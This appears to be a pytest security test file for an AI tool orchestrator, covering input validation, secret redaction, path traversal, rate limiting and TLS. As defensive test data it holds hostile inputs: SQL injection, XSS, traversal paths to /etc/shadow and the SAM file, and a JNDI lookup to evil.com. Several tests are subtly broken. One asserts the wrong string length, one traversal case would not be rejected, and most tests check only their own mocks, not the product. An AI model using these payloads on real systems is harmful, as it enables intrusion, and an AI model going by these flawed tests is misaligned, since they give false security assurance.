"""Security tests for async-toolformer-orchestrator."""

import asyncio
import json
import re
from typing import Dict, List
from unittest.mock import AsyncMock, MagicMock, patch

import pytest


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    async def test_tool_argument_validation(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test that tool arguments are properly validated."""
        # Test SQL injection attempt
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{ 7*7 }}",
            "\x00\x01\x02",  # Null bytes
        ]
        
        for malicious_input in malicious_inputs:
            tool = AsyncMock()
            tool.__name__ = "test_tool"
            
            # Mock tool that validates input
            async def secure_tool(user_input: str) -> str:
                # Basic validation that should reject malicious input
                if any(char in user_input for char in ["'", '"', "<", ">", "{", "}", "$"]):
                    raise ValueError("Invalid characters in input")
                if "\x00" in user_input:
                    raise ValueError("Null bytes not allowed")
                return f"Safe output: {user_input}"
            
            tool.side_effect = secure_tool
            
            # Test that malicious input is rejected
            with pytest.raises(ValueError, match="Invalid characters|Null bytes"):
                await tool(malicious_input)

    async def test_api_key_sanitization(
        self,
        mock_orchestrator: AsyncMock,
        caplog
    ):
        """Test that API keys are not logged or exposed."""
        api_keys = [
            "sk-1234567890abcdef",
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",
            "anthropic_api_key_12345",
        ]
        
        for api_key in api_keys:
            # Simulate a tool that might accidentally log API keys
            tool = AsyncMock()
            tool.__name__ = "api_tool"
            
            async def api_tool_func(key: str) -> str:
                # This should never actually log the key
                import logging
                logger = logging.getLogger("async_toolformer")
                logger.info(f"Making API call with key: [REDACTED]")
                return "API response"
            
            tool.side_effect = api_tool_func
            
            # Execute tool
            result = await tool(api_key)
            
            # Check that API key is not in logs
            log_content = " ".join([record.message for record in caplog.records])
            assert api_key not in log_content
            assert "[REDACTED]" in log_content or "Making API call" in log_content

    async def test_path_traversal_prevention(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\file.txt",
        ]
        
        for malicious_path in malicious_paths:
            tool = AsyncMock()
            tool.__name__ = "file_tool"
            
            async def secure_file_tool(filepath: str) -> str:
                # Validate file path to prevent traversal
                import os
                normalized = os.path.normpath(filepath)
                if normalized.startswith("/") or "\\" in normalized or ".." in normalized:
                    raise ValueError("Invalid file path")
                return f"File contents: safe"
            
            tool.side_effect = secure_file_tool
            
            # Test that malicious paths are rejected
            with pytest.raises(ValueError, match="Invalid file path"):
                await tool(malicious_path)


@pytest.mark.security
class TestAuthenticationAndAuthorization:
    """Test authentication and authorization mechanisms."""

    async def test_api_key_validation(
        self,
        mock_openai_client: AsyncMock,
        mock_anthropic_client: AsyncMock
    ):
        """Test that invalid API keys are handled securely."""
        invalid_keys = [
            "",
            "invalid_key",
            None,
            "sk-",  # Too short
            "fake-key-12345",
        ]
        
        for invalid_key in invalid_keys:
            # Mock client with invalid key
            mock_openai_client.api_key = invalid_key
            
            # Should raise authentication error, not expose key
            mock_openai_client.chat.completions.create.side_effect = Exception(
                "Invalid API key"
            )
            
            with pytest.raises(Exception, match="Invalid API key"):
                await mock_openai_client.chat.completions.create(
                    model="gpt-4o",
                    messages=[{"role": "user", "content": "test"}]
                )

    async def test_rate_limit_bypass_prevention(
        self,
        mock_redis: AsyncMock
    ):
        """Test prevention of rate limit bypass attempts."""
        # Simulate attempts to bypass rate limiting
        bypass_attempts = [
            {"service": "openai", "user_id": None},  # Missing user ID
            {"service": "openai", "user_id": ""},    # Empty user ID
            {"service": "", "user_id": "user123"},   # Empty service
            {"service": None, "user_id": "user123"}, # None service
        ]
        
        for attempt in bypass_attempts:
            # Mock rate limiter that validates input
            async def validate_rate_limit(service: str, user_id: str) -> bool:
                if not service or not user_id:
                    raise ValueError("Service and user_id are required")
                
                # Check rate limit
                key = f"rate_limit:{service}:{user_id}"
                current = await mock_redis.incr(key)
                if current == 1:
                    await mock_redis.expire(key, 60)
                return current <= 100
            
            # Test that invalid parameters are rejected
            with pytest.raises(ValueError, match="Service and user_id are required"):
                await validate_rate_limit(attempt["service"], attempt["user_id"])


@pytest.mark.security
class TestDataProtection:
    """Test data protection and privacy measures."""

    async def test_sensitive_data_scrubbing(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test that sensitive data is scrubbed from results."""
        sensitive_patterns = [
            "password=secret123",
            "ssn=123-45-6789",
            "credit_card=4111-1111-1111-1111",
            "email=user@example.com",
            "phone=+1-555-123-4567",
        ]
        
        for sensitive_data in sensitive_patterns:
            tool = AsyncMock()
            tool.__name__ = "data_tool"
            
            async def scrubbing_tool(data: str) -> str:
                # Simulate data scrubbing
                scrubbed = data
                scrubbed = re.sub(r'password=[^&\s]*', 'password=[REDACTED]', scrubbed)
                scrubbed = re.sub(r'\d{3}-\d{2}-\d{4}', '[SSN-REDACTED]', scrubbed)
                scrubbed = re.sub(r'\d{4}-\d{4}-\d{4}-\d{4}', '[CARD-REDACTED]', scrubbed)
                scrubbed = re.sub(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', '[EMAIL-REDACTED]', scrubbed)
                scrubbed = re.sub(r'\+\d{1,3}-\d{3}-\d{3}-\d{4}', '[PHONE-REDACTED]', scrubbed)
                return scrubbed
            
            tool.side_effect = scrubbing_tool
            
            result = await tool(sensitive_data)
            
            # Verify sensitive data is scrubbed
            assert "secret123" not in result
            assert "123-45-6789" not in result
            assert "4111-1111-1111-1111" not in result
            assert "user@example.com" not in result
            assert "+1-555-123-4567" not in result
            assert "[REDACTED]" in result or "[SSN-REDACTED]" in result

    async def test_memory_cleanup(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test that sensitive data is cleaned from memory."""
        sensitive_data = "secret_api_key_12345"
        
        tool = AsyncMock()
        tool.__name__ = "memory_tool"
        
        async def memory_aware_tool(secret: str) -> str:
            # Process secret data
            result = f"Processed: {len(secret)} chars"
            
            # Explicitly clear sensitive data from local variables
            secret = None
            del secret
            
            return result
        
        tool.side_effect = memory_aware_tool
        
        result = await tool(sensitive_data)
        
        # Verify result doesn't contain sensitive data
        assert sensitive_data not in result
        assert "Processed: 21 chars" == result

    async def test_secure_error_handling(
        self,
        mock_orchestrator: AsyncMock,
        caplog
    ):
        """Test that error messages don't leak sensitive information."""
        sensitive_info = "database_password_secret123"
        
        tool = AsyncMock()
        tool.__name__ = "error_tool"
        
        async def error_prone_tool(data: str) -> str:
            # Simulate an error that might leak sensitive data
            raise Exception(f"Database connection failed")  # Good: no sensitive data
            # raise Exception(f"Database connection failed with password: {data}")  # Bad: leaks data
        
        tool.side_effect = error_prone_tool
        
        with pytest.raises(Exception) as exc_info:
            await tool(sensitive_info)
        
        # Verify error message doesn't contain sensitive data
        error_message = str(exc_info.value)
        assert sensitive_info not in error_message
        assert "Database connection failed" in error_message
        
        # Check logs don't contain sensitive data
        log_content = " ".join([record.message for record in caplog.records])
        assert sensitive_info not in log_content


@pytest.mark.security
class TestSecureCommunication:
    """Test secure communication mechanisms."""

    async def test_tls_verification(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test that TLS certificates are properly verified."""
        # Mock aiohttp session with TLS verification
        with patch("aiohttp.ClientSession") as mock_session:
            session_instance = AsyncMock()
            mock_session.return_value.__aenter__.return_value = session_instance
            
            # Configure session to require TLS verification
            async def make_request(url: str, **kwargs) -> Dict:
                # Verify TLS settings
                if not kwargs.get("ssl", True):
                    raise ValueError("TLS verification required")
                
                return {"status": "success", "data": "secure response"}
            
            session_instance.get.side_effect = make_request
            
            # Test secure request
            tool = AsyncMock()
            tool.__name__ = "http_tool"
            
            async def secure_http_tool(url: str) -> str:
                async with mock_session() as session:
                    response = await session.get(url, ssl=True)
                    return response["data"]
            
            tool.side_effect = secure_http_tool
            
            result = await tool("https://api.example.com/data")
            assert result == "secure response"
            
            # Test that insecure requests are rejected
            async def insecure_http_tool(url: str) -> str:
                async with mock_session() as session:
                    response = await session.get(url, ssl=False)
                    return response["data"]
            
            tool.side_effect = insecure_http_tool
            
            with pytest.raises(ValueError, match="TLS verification required"):
                await tool("https://api.example.com/data")

    async def test_request_timeout_security(
        self,
        mock_orchestrator: AsyncMock
    ):
        """Test that request timeouts prevent DoS attacks."""
        tool = AsyncMock()
        tool.__name__ = "timeout_tool"
        
        async def timeout_protected_tool(delay: float) -> str:
            # Simulate a tool with timeout protection
            timeout = 5.0  # 5 second timeout
            
            try:
                await asyncio.wait_for(asyncio.sleep(delay), timeout=timeout)
                return "Completed successfully"
            except asyncio.TimeoutError:
                raise Exception("Request timed out")
        
        tool.side_effect = timeout_protected_tool
        
        # Test normal operation
        result = await tool(1.0)  # 1 second delay
        assert result == "Completed successfully"
        
        # Test timeout protection
        with pytest.raises(Exception, match="Request timed out"):
            await tool(10.0)  # 10 second delay, should timeout


@pytest.mark.security
class TestSecurityMonitoring:
    """Test security monitoring and alerting."""

    async def test_suspicious_activity_detection(
        self,
        mock_orchestrator: AsyncMock,
        mock_redis: AsyncMock
    ):
        """Test detection of suspicious activity patterns."""
        # Simulate rapid fire requests (potential abuse)
        user_id = "test_user"
        request_count = 100
        time_window = 1  # 1 second
        
        suspicious_threshold = 50  # 50 requests per second is suspicious
        
        async def activity_monitor(user: str, action: str) -> bool:
            key = f"activity:{user}:{action}"
            count = await mock_redis.incr(key)
            if count == 1:
                await mock_redis.expire(key, time_window)
            
            if count > suspicious_threshold:
                # Log suspicious activity (don't block in test)
                import logging
                logger = logging.getLogger("async_toolformer.security")
                logger.warning(f"Suspicious activity detected for user {user}: {count} {action} requests")
                return False  # Suspicious
            
            return True  # Normal
        
        # Mock Redis to simulate counting
        call_count = 0
        
        def mock_incr(key):
            nonlocal call_count
            call_count += 1
            return call_count
        
        mock_redis.incr.side_effect = mock_incr
        
        # Simulate suspicious activity
        for i in range(request_count):
            is_normal = await activity_monitor(user_id, "tool_execution")
            if i > suspicious_threshold:
                assert not is_normal  # Should detect as suspicious

    async def test_security_audit_logging(
        self,
        mock_orchestrator: AsyncMock,
        caplog
    ):
        """Test that security events are properly logged."""
        security_events = [
            {"event": "authentication_failure", "user": "test_user", "reason": "invalid_key"},
            {"event": "rate_limit_exceeded", "user": "abuser", "service": "openai"},
            {"event": "suspicious_input", "user": "attacker", "input": "malicious_payload"},
        ]
        
        import logging
        security_logger = logging.getLogger("async_toolformer.security")
        
        for event in security_events:
            # Log security event
            security_logger.warning(
                f"Security event: {event['event']}",
                extra={
                    "event_type": "security",
                    "user": event["user"],
                    "event_details": event
                }
            )
        
        # Verify security events are logged
        security_logs = [
            record for record in caplog.records 
            if "security" in record.name and record.levelname == "WARNING"
        ]
        
        assert len(security_logs) == len(security_events)
        
        for i, log_record in enumerate(security_logs):
            assert "Security event" in log_record.message
            assert security_events[i]["event"] in log_record.message